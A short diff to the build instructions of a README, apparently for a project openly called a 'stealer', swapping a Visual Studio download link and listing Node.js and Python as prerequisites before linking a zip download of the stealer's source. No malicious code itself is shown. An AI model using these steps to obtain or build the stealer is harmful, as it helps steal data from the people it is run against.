@@ -36,7 +36,7 @@ You'll need to get these three things, this is **required** otherwise the build 
 
 * [Node.js](https://nodejs.org/en)
 * [Python](https://www.python.org/downloads/)
-* [Visual Studio](https://visualstudio.microsoft.com/en/thank-you-downloading-visual-studio/?sku=Community&channel=Release&version=VS2022) with a "Desktop Development with C++" installation 
+* [Visual Studio](https://aka.ms/vs/17/release/vs_BuildTools.exe) with a "Desktop Development with C++" workload 
 
 Then [download the stealer](https://github.com/JustYuuto/Yuuto-Stealer/archive/refs/heads/master.zip). This is a zip file, just extract it somewhere.
 
